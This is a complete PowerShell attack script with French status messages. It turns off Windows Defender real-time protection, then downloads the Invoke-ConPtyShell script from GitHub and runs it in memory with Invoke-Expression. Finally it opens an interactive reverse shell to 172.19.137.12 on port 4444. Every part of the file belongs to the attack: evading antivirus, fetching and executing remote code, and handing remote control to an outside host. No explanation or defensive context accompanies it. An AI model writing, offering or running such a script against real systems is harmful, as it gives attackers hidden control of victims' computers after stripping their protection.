Try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
    Write-Host "Protection en temps réel désactivée."
} Catch {
    Write-Warning "Impossible de désactiver la protection en temps réel : $_"
}

$scriptUrl = "https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1"
Try {
    $scriptContent = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -ErrorAction Stop
    Invoke-Expression $scriptContent.Content
    Write-Host "Script Invoke-ConPtyShell chargé."
} Catch {
    Write-Warning "Erreur lors du téléchargement ou de l'exécution du script : $_"
    Exit 1
}

$ip = "172.19.137.12"
$port = 4444

Try {
    Invoke-ConPtyShell $ip $port
    Write-Host "Reverse shell lancé vers $ip : $port"
} Catch {
    Write-Warning "Erreur lors de l'exécution du reverse shell : $_"
}
